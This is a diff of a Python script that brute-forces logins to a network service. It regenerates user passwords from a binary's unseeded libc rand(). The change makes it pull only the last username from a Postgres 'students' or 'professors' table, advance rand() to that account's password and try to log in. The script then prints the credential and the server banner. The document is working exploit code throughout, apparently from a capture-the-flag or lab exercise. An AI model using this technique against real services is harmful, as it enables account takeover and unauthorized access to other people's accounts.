@@ -1,14 +1,12 @@
 #!/usr/bin/env python3
-"""
-Brute-force logins using deterministic rand() passwords.
+"""Brute-force the latest account using deterministic rand() passwords.
 
 Steps:
- 1) Reads usernames from the given Postgres table (students/professors).
+ 1) Reads only the last username from the given Postgres table.
  2) Generates passwords exactly like the binary: for each account, 32 chars of (rand()%25)+65,
-    with global rand() seeded to 1 (binary never calls srand).
+    with global rand() seeded to 1 (binary never calls srand). We advance rand() for each
+    prior account to reach the correct password for the last one.
  3) Connects to the service over TCP and tries to log in, printing the result and banner.
-
-Run on the same host/container as the service so libc rand() matches.
 """
 
 import socket
@@ -51,7 +49,7 @@ class Account:
     password: str
 
 
-def fetch_accounts() -> list[Account]:
+def fetch_last_account() -> Account:
     conn = psycopg.connect(
         host=DB_HOST,
         port=DB_PORT,
@@ -60,17 +58,19 @@ def fetch_accounts() -> list[Account]:
         dbname=DB_NAME,
     )
     cur = conn.cursor()
-    cur.execute(f"SELECT id, name FROM {DB_TABLE} ORDER BY id ASC;")
-    rows = cur.fetchall()
+    cur.execute(f"SELECT id, name FROM {DB_TABLE} ORDER BY id DESC LIMIT 1;")
+    last = cur.fetchone()
+    cur.execute(f"SELECT COUNT(*) FROM {DB_TABLE};")
+    total_row = cur.fetchone()
+    total = total_row[0] if total_row else 0
     cur.close()
     conn.close()
 
     reset_rand(1)  # match binary: no srand() call, seed defaults to 1
-    accounts: list[Account] = []
-    for _, name in rows:
-        pwd = next_password()
-        accounts.append(Account(idx=len(accounts), name=name, password=pwd))
-    return accounts
+    for _ in range(max(total - 1, 0)):
+        next_password()
+    pwd = next_password() if total else ""
+    return Account(idx=total - 1, name=last[1] if last else "", password=pwd)
 
 
 def recv_until(
@@ -103,15 +103,17 @@ def try_login(acc: Account, as_prof: bool) -> tuple[bool, bytes]:
 
 
 def main() -> None:
-    accounts = fetch_accounts()
-    print(f"[+] Loaded {len(accounts)} accounts from {DB_TABLE}")
+    account = fetch_last_account()
+    if not account.name:
+        print("[!] No accounts found")
+        return
+    print(f"[+] Trying last account idx={account.idx} name={account.name} from {DB_TABLE}")
     as_prof = DB_TABLE == "professors"
-    for acc in accounts:
-        ok, banner = try_login(acc, as_prof)
-        status = "OK" if ok else "FAIL"
-        print(f"[{status}] {acc.name} / {acc.password}")
-        for line in banner.decode(errors="ignore").splitlines()[:5]:
-            print("  ", line)
+    ok, banner = try_login(account, as_prof)
+    status = "OK" if ok else "FAIL"
+    print(f"[{status}] {account.name} / {account.password}")
+    for line in banner.decode(errors="ignore").splitlines()[:5]:
+        print("  ", line)
 
 
 if __name__ == "__main__":
